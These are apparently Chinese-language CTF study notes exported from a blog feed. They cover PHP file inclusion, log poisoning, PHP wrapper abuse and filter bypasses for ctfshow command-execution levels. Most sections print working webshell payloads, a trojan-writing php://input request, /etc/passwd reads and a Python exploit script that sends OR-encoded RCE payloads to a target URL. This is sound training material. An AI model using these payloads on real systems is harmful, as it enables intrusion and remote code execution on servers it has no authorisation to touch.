title="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"></a>日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限</h4><ol><li>nginx日志文件路径：?file=/var/log/nginx/access.log</li><li>apache2日志文件路径:?file=/var/log/apache2/access.log</li><li>直接访问会显示User-Agent的信息<br><img src="https://img-blog.csdnimg.cn/20210227204642790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MDg2MjE4,size_16,color_FFFFFF,t_70"></li><li>写入php文件，进行getshell<br>User-Agent:<?php system("cat flag.php");?></li><li>注意：访问日志文件只会显示前几次的访问情况，要查看当前访问情况需要再一次访问</li></ol><h4 id="题"><a href="#题" class="headerlink" title="题"></a>题</h4><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723145912.png"></li><li>对php和data有过滤，就不能使用php://filter和data://text/plain,伪协议了</li><li>注意是先传User-Agent,到index.php中</li><li>再去访问 ?file=/var/log/nginx/access.log 看看是否包含成功<pre class="line-numbers language-none"><code class="language-none">User-Agent:&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>因为是加的http header，所以原题对传入的file值不会产生过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220728151332.png"></li><li>User-Agent中写post传参，传入一个变量，将变量的值设为木马，和逃逸很相似<pre class="line-numbers language-none"><code class="language-none">User-Agent:&lt;?php eval($_POST[1]);?&gt;1&#x3D;system(&quot;ls .&#x2F;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="什么是php伪协议"><a href="#什么是php伪协议" class="headerlink" title="什么是php伪协议"></a>什么是php伪协议</h2><ol><li>php伪协议实际上就是支持的协议与封装协议</li></ol><h2 id="大佬的博客"><a href="#大佬的博客" class="headerlink" title="大佬的博客"></a>大佬的博客</h2><p><a href="https://blog.csdn.net/Jeff_12138/article/details/124815370">https://blog.csdn.net/Jeff_12138/article/details/124815370</a></p><h2 id="什么时候使用php伪协议"><a href="#什么时候使用php伪协议" class="headerlink" title="什么时候使用php伪协议"></a>什么时候使用php伪协议</h2><h3 id="文件包含时使用"><a href="#文件包含时使用" class="headerlink" title="文件包含时使用!!!"></a>文件包含时使用!!!</h3><ol><li>例如这个时候：<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163511.png"><h3 id="可能遇见的文件包含函数"><a href="#可能遇见的文件包含函数" class="headerlink" title="可能遇见的文件包含函数"></a>可能遇见的文件包含函数</h3><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163727.png"></li></ol><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><ol><li>allow_url_fopen:on<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720160552.png"></li><li>allow_url_include:on<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720161022.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720161043.png"></li></ol><h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain,data:&#x2F;&#x2F;text&#x2F;plain;base64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><ol><li>data://text/plain,    可以把后面的伪代码当作代码执行<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo?&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>data://text/plain;base64,<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b   &#x2F;&#x2F;后面这一串就是base64编码后的&lt;?php phpinfo()?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>allow_url_fopen和allow_url_include为on和close都可，没有什么严格的条件</li></ol><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol><li>访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen和allow_url_include的影响</li><li>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。如果上传一个1.txt，仍然可以当作一个php文件去解析</li></ol><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ol><li>file:// — 访问本地文件系统</li><li>说明文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径(不以://indows 盘符开头的路径)提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。</li></ol><h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ol><li>allow_url_fopen:off/on</li><li>allow_url_include :仅php://input php://stdin php://memory php://temp 需要on</li></ol><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><ol><li>php:// 访问各个输入/输出流(I/O streams)，在CTF中经常使用的是php://filter和php://input</li><li>php://filter用于读取源码</li><li>php://input用于执行php代码</li></ol><h3 id="php-filter-参数详解"><a href="#php-filter-参数详解" class="headerlink" title="php://filter 参数详解"></a>php://filter 参数详解</h3><ol><li>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递</li><li>简单点说，路径上写参数，参数加到php://filter的路径后面</li></ol><h3 id="示例，最常用的php-filter伪代码"><a href="#示例，最常用的php-filter伪代码" class="headerlink" title="示例，最常用的php://filter伪代码"></a>示例，最常用的php://filter伪代码</h3><ol><li>php://filter/read=convert.base64-encode/resource=[文件名]//后面的可以省略<a href="%E9%92%88%E5%AF%B9php%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81base64%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81">读取文件源码</a><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>php://input + [POST DATA]执行php代码<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input[POST DATA部分][POST DATA]就是php代码，例如&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>如果有写入权限，则可以写入一句话木马<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input[POST DATA部分]&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h2><ol><li>绕过php，flag等特殊字符：使用通配符</li><li>绕过system等执行函数：使用反单引号</li><li>绕过了. \ `等函数常用字符<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718153954.png">,但是没有绕过<strong>$和_</strong>,使用<strong>逃逸</strong>，c=eval($_GET[1])</li><li>最nb的是可以使用URL编码进行绕过，因为服务器会自动解一层url编码，所以可以对过滤掉的字符进行一次url编码</li><li>过滤了分号，最后一条语句可以不带分号，结束的标志为’?&gt;’,则我们可以将两条语句中间需要分号的位置替换为’?&gt;’,那么就可以使用两条语句</li><li>过滤了分号和括号，则必须使用语言结构，echo print isset unset include require，使用include加上php过滤器实现</li><li>文件包含题目：使用伪协议：data伪协议可以执行后面的php代码</li><li>过滤掉了字符和数字：使用url编码去代替字符，如果可以使用或运算，即可通过或运算去取字符，web41</li><li>如果是过滤掉了冒号，则是想要过滤掉使用伪协议的方法，那么我们可以先逃逸出去一个变量后再使用伪协议进行文件包含操作</li><li>绕过了eval和system等执行函数，我们可以使用data伪协议，data伪协议data://text/plain,可以直接执行后面跟着的php代码</li><li>如果不能直接访问flag.php，可以先使用mv flag.php 1.txt进行重命名之后再访问1.txt,从而cat到flag.php中的内容</li><li>当遇到了黑洞问题，可以使用双写绕过，例如?c=ls;ls</li><li>当遇到了黑洞问题，并且过滤了分号，可以使用&amp;&amp;来起到分号的分隔作用</li><li>当过滤掉了空格，可以使用其它的URL编码后的空白符:<pre class="line-numbers language-none"><code class="language-none">空格 %26 +   tab水平制表符 %09 回车 %0a或%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><h3 id="cookie的概念"><a href="#cookie的概念" class="headerlink" title="cookie的概念"></a>cookie的概念</h3><ol><li>cookie用于识别用户，cookie是服务器留在用户计算机中的小文件，每当相同的计算机通过浏览器请求页面时，它同时会发送cookie<h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3></li><li>检查变量是否为空，还要检查变量是否已经设置/声明</li><li>意味着必须声明，并且不为NULL，才能返回true</li></ol><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h3><ol><li>使用正则表达式对字符串中的“w3schools”执行不区分大小写的搜索：</li><li>该函数返回是否在字符串中找到匹配项。preg_match()</li><li>preg_match(pattern, input, matches, flags, offset)<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718145036.png"></li></ol><h3 id="php中的通配符"><a href="#php中的通配符" class="headerlink" title="php中的通配符"></a>php中的通配符</h3><ol><li>和Linux的通配符相同</li><li>*可以代表任意个字符</li><li>？可以代表一个字符，对字符的数量有限制</li></ol><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><ol><li>system($shell,$shell_return);</li><li>函数的作用是执行内部的shell命令，并且在函数执行后，直接在终端窗口打印命令执行的结果</li><li>函数的返回值是命令的执行结果的最后一行</li></ol><h3 id="cp-from-to"><a href="#cp-from-to" class="headerlink" title="cp(from , to);"></a>cp(from , to);</h3><ol><li>同linux的cp命令</li></ol><h3 id="题"><a href="#题" class="headerlink" title="题"></a>题</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718150508.png"></li><li>get传参，传给变量c，在变量c中使用preg_match来匹配flag，如果没有flag，就执行变量c中的语句</li><li>给c传值，用system函数产生回显<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718150648.png">，可以解析并执行</li><li>因为不能出现flag，所以使用<strong>cp命令</strong>给flag.php换个名字</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718150936.png"></li><li>直接在路径后面使用文件名称来访问<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718151056.png"></li></ol><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><h3 id="反单引号"><a href="#反单引号" class="headerlink" title="反单引号"></a>反单引号</h3><ol><li>反单引号在php中和system()函数相同，起到命令执行的作用<pre class="line-numbers language-none"><code class="language-none">&#96;cp flag.php 1.txt&#96;  &#x2F;&#x2F;这个地方是反单引号和system(&#39;cp flag.php 1.txt&#39;)  &#x2F;&#x2F;这个地方是单引号的作用是相同的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="题-1"><a href="#题-1" class="headerlink" title="题"></a>题</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718151237.png"></li><li>多了几个过滤</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718151852.png"></li></ol><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><h3 id="preg-match中的转义"><a href="#preg-match中的转义" class="headerlink" title="preg_match中的转义"></a>preg_match中的转义</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718152309.png"></li><li>\后面的字符代表转义，例如： ‘.‘ 即为’.’</li></ol><h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><ol><li>中间搭一个桥，使用超全局变量</li></ol><h3 id="题-2"><a href="#题-2" class="headerlink" title="题"></a>题</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718152514.png"></li><li>过滤了更多，对’和.都有过滤</li><li>使用c=eval($_GET[1]);对c进行逃逸操作，这个变量1逃逸出去了，1不属于c,则变量1可以使用任何过滤掉的字符</li><li>构造?c=eval($_GET[1]);&amp;1=system(‘cp flag.php 1.txt’);</li><li>在路径后面直接加上/1.txt，就可以查看到flag.php中的内容了</li></ol><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><ol><li>include语句获取指定文件中存在的所有文本/代码/标记，并将其复制到使用include语句的文件中<pre class="line-numbers language-none"><code class="language-none">include require<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>希望在报错时继续执行并且向用户显示输出，使用include语句，因为当include语句包含的文件不存在时，只是产生一个警告，但是脚本会继续执行</li><li>而require引用的文件如果不存在，就会提示错误，并终止脚本的运行<pre class="line-numbers language-none"><code class="language-none">include &quot;header.htm&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>上面的header.htm中可以php语句，因为可以包含htm静态文件，所以可以设计缓存机制，比如把一些页面分为几部分，有一些读取数据库耗费效率的部分可以缓存为html，然后通过include</li><li>文件上传中include代码执行原理：<pre class="line-numbers language-none"><code class="language-none">$i&#x3D;include &#39;abc.php&#39;;abc.php中源码为&lt;?php    return &quot;hello world&quot;;?&gt;那么echo $i;如果include中引用的源码中使用了return，则返回return中的返回值，如果没有，则返回1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h3><ol><li>大致方法为按照文件包含的方法去做</li><li>空格绕过：使用url编码</li><li>因为过滤了反单引号，可以使用include包含执行代码去绕过<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122127.png">，发现可以回显</li><li>可以使用文件包含的原理来实现<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122230.png">，原理就是加上一个php的过滤器</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122336.png">，得到一串base64编码，解码即可获得flag<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122415.png"></li></ol><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><ol><li>与web32中的方式一样，这次也可以使用require</li><li>尝试?c=%0a$_GET[1]?&gt;&amp;1=/etc/passwd发现可以解析</li><li>加上过滤器，php://filter/convert.base64-encode/resource=index.php，找flag.php即可得到base64编码，解码得到flag</li></ol><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><h3 id="isset-1"><a href="#isset-1" class="headerlink" title="isset()"></a>isset()</h3><pre class="line-numbers language-none"><code class="language-none">bool isset ( mixed $var [, mixed $... ] )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>用于检测变量是否已经设置，并且不为NULL</li><li>如果一次传入多个参数，那么isset()只有在全部参数<strong>都被设置</strong>时才会返回TRUE，计算过程从左到右，中途遇到没有设置的变量会立刻停止</li><li>mixed $var为传入的变量</li></ol><h3 id="unset"><a href="#unset" class="headerlink" title="unset()"></a>unset()</h3><ol><li>用于销毁给定的变量<pre class="line-numbers language-none"><code class="language-none">void unset ( mixed $var [, mixed $... ] )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>$var是要销毁的变量</li></ol><h3 id="题：-1"><a href="#题：-1" class="headerlink" title="题："></a>题：</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720094642.png">过滤了冒号，为了过滤php伪协议形式的命令</li><li>分号和括号过滤，则只能使用语言结构，语言结构的函数：print echo isset unset include require</li><li>对于?c=print%0a$_GET[1]?&gt;&amp;1=phpinfo();只能出现</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720154430.png"></li><li>的字符：二进制数据段和代码段的区别关系，就是print没法像eval一样将字符当作php代码去执行</li><li>使用include就可以使用文件包含的方式去实现命令执行</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720154643.png"></li></ol><h2 id="对于get传参时不加单引号的问题"><a href="#对于get传参时不加单引号的问题" class="headerlink" title="对于get传参时不加单引号的问题"></a>对于get传参时不加单引号的问题</h2><ol><li>$_GET[1]和$_GET[‘1’]</li><li>$_GET[1]不加单引号可以起到php向下兼容的作用，但是后面可能会随着php版本更新取消这种写法</li><li>所以不确定php版本和是否被禁止，应该都试一遍</li></ol><h2 id="web37，文件包含"><a href="#web37，文件包含" class="headerlink" title="web37，文件包含"></a>web37，文件包含</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><ol><li><a href="https://strongwill.top/php%E4%BC%AA%E5%8D%8F%E8%AE%AE">https://strongwill.top/php伪协议</a></li></ol><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163511.png"></li><li>发现是一个文件包含题目，考虑使用php伪协议</li><li>对于要包含php执行代码的文件包含题目，使用data://text/plain,伪协议可以绕过过滤了eval等执行函数的情况<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>执行上面的函数发现可以执行，满足fopen和include都开启的条件，则后面的php执行代码可以操作<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;mv fla?.php 1.txt&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>和过滤后缀的题目一样，重命名后再在路径后面直接添加1.txt即可访问到</li></ol><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721141702.png"></li><li>发现还是一个文件包含题目，考虑使用php伪协议</li><li>使用伪协议发现可以执行<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721141821.png"></li><li>继续执行将flag.php文件换名的操作，最后直接在URL后面加上新换名的文件即可查看到flag<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; system(&quot;cp fla?.??? 1.txt&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721142504.png"></li><li>发现只是过滤了参数c中的”flag“字段，还是一个文件包含题目，考虑是使用伪协议</li><li>按照上面的方式即可得到flag</li></ol><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><h3 id="array-pop"><a href="#array-pop" class="headerlink" title="array_pop()"></a>array_pop()</h3><ol><li>删除数组中的最后一个元素<pre class="line-numbers language-none"><code class="language-none">array_pop(array)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>其中array参数是必须的</li><li>返回值：返回数组中的最后一个值，如果数组是空的，或者不是一个数组，将返回NULL</li></ol><h3 id="print-r"><a href="#print-r" class="headerlink" title="print_r()"></a>print_r()</h3><ol><li>print_r()函数用于打印变量，以更容易理解的方式展示<pre class="line-numbers language-none"><code class="language-none">bool print_r(mixed $expression [,bool $return]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>$expression为要打印的变量，如果是string,integer,float则会打印变量值本身，如果是array类型，将会按照一定的格式显示键和元素</li><li>$return:可选，如果为true，则不会输出结果，而是将返回值的结果赋值给一个变量，false则直接输出结果，默认为false<pre class="line-numbers language-none"><code class="language-none">&lt;?php$a &#x3D; array (&#39;a&#39; &#x3D;&gt; &#39;apple&#39;, &#39;b&#39; &#x3D;&gt; &#39;banana&#39;, &#39;c&#39; &#x3D;&gt; array (&#39;x&#39;,&#39;y&#39;,&#39;z&#39;));print_r ($a);?&gt;返回结果为Array(    [a] &#x3D;&gt; apple    [b] &#x3D;&gt; banana    [c] &#x3D;&gt; Array        (            [0] &#x3D;&gt; x            [1] &#x3D;&gt; y            [2] &#x3D;&gt; z        ))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$b &#x3D; array (&#39;m&#39; &#x3D;&gt; &#39;monkey&#39;, &#39;foo&#39; &#x3D;&gt; &#39;bar&#39;, &#39;x&#39; &#x3D;&gt; array (&#39;x&#39;, &#39;y&#39;, &#39;z&#39;));$results &#x3D; print_r ($b, true); &#x2F;&#x2F; $results 包含了 print_r 的输出结果?&gt;这个则没有返回值，因为输出结果赋值给了results变量，$return的参数值设置为了true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h3><ol><li>next()函数将内部指针指向数组中的下一个元素，并输出</li><li>返回值为内部指针指向的下一个元素的值</li><li>next(array)内部参数为array，是一个数组</li></ol><h3 id="current"><a href="#current" class="headerlink" title="current()"></a>current()</h3><ol><li>输出数组中当前内部指针指向的元素的值</li><li>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</li><li>该函数不会移动内部指针</li></ol><h3 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h3><h3 id="prev"><a href="#prev" class="headerlink" title="prev()"></a>prev()</h3><h3 id="reset"><a href="#reset" class="headerlink" title="reset()"></a>reset()</h3><h3 id="each"><a href="#each" class="headerlink" title="each()"></a>each()</h3><ol><li>each()返回的不只是值，是键值对，并且将内部指针向前移动<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721145855.png"></li></ol><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><ol><li>get_defined_vars()函数返回由所有已经定义的变量所组成的数组<pre class="line-numbers language-none"><code class="language-none">array get_defined_vars(void);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>返回值：返回一个包含所有已经定义变量列表的多维数组，这些变量包括环境变量，服务器变量，和用户定义的变量</li></ol><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><ol><li>因为不能用$,所以不能使用之前的逃逸字符来绕过</li><li>考虑是否能通过打印变量，从变量中获取到信息<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;print_r(get_defined_vars());<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721150824.png"><br>发现是通过post给这个数组传参，尝试加一个post值</li><li>post传参后回显<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721150904.png"></li><li>为了拿到array中的那个phpinfo()的字符串，rce一下，使用next函数将指针后移,并且形成了一个新的数组，这个数组的值为phpinfo(),键为它的键</li><li>为了拿到指针指向的那个值，弹出array_pop()，将会返回数组中的最后一个值</li></ol><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h3 id="或运算取字符"><a href="#或运算取字符" class="headerlink" title="或运算取字符"></a>或运算取字符</h3><ol><li>%40 | %01 可以取到A，或运算是两个都为0才为0，一个为1则为1</li><li>计算机中保存URL编码是通过十六进制保存的<pre class="line-numbers language-none"><code class="language-none">%40的二进制为0100 0000%01的二进制为0000 0001取或得到     0100 0001结果从二进制转为十六进制，得到结果为65，转ascii码为A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="生成可用字符的脚本"><a href="#生成可用字符的脚本" class="headerlink" title="生成可用字符的脚本"></a>生成可用字符的脚本</h3><ol><li>原理：从进行异或的字符中排除掉被过滤的，然后判断异或得到的字符是否为可见字符<pre class="line-numbers language-none"><code class="language-none">&lt;?php$myfile &#x3D; fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);$contents&#x3D;&quot;&quot;;for ($i&#x3D;0; $i &lt; 256; $i++) &#123; for ($j&#x3D;0; $j &lt;256 ; $j++) &#123; if($i&lt;16)&#123;$hex_i&#x3D;&#39;0&#39;.dechex($i);&#125;else&#123;$hex_i&#x3D;dechex($i);&#125;if($j&lt;16)&#123;$hex_j&#x3D;&#39;0&#39;.dechex($j);&#125;else&#123;$hex_j&#x3D;dechex($j);&#125;$preg &#x3D; &#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;;if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;echo &quot;&quot;;    &#125;  else&#123;$a&#x3D;&#39;%&#39;.$hex_i;$b&#x3D;&#39;%&#39;.$hex_j;$c&#x3D;(urldecode($a)|urldecode($b));if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) &#123;$contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;&#125;&#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="python脚本跑"><a href="#python脚本跑" class="headerlink" title="python脚本跑"></a>python脚本跑</h3><ol><li>用法：python exp.py <url></li><li>传递参数getflag<pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osos.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行if(len(argv)!&#x3D;2):   print(&quot;&#x3D;&quot;*50)   print(&#39;USER：python exp.py &lt;url&gt;&#39;)   print(&quot;eg：  python exp.py http:&#x2F;&#x2F;ctf.show&#x2F;&quot;)   print(&quot;&#x3D;&quot;*50)   exit(0)url&#x3D;argv[1]def action(arg):   s1&#x3D;&quot;&quot;   s2&#x3D;&quot;&quot;   for i in arg:       f&#x3D;open(&quot;rce_or.txt&quot;,&quot;r&quot;)       while True:           t&#x3D;f.readline()           if t&#x3D;&#x3D;&quot;&quot;:               break           if t[0]&#x3D;&#x3D;i:               #print(i)               s1+&#x3D;t[2:5]               s2+&#x3D;t[6:9]               break       f.close()   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param&#x3D;action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))   data&#x3D;&#123;       &#39;c&#39;:urllib.parse.unquote(param)       &#125;   r&#x3D;requests.post(url,data&#x3D;data)   print(&quot;\n[*] result:\n&quot;+r.text)<span aria-hidden="true" 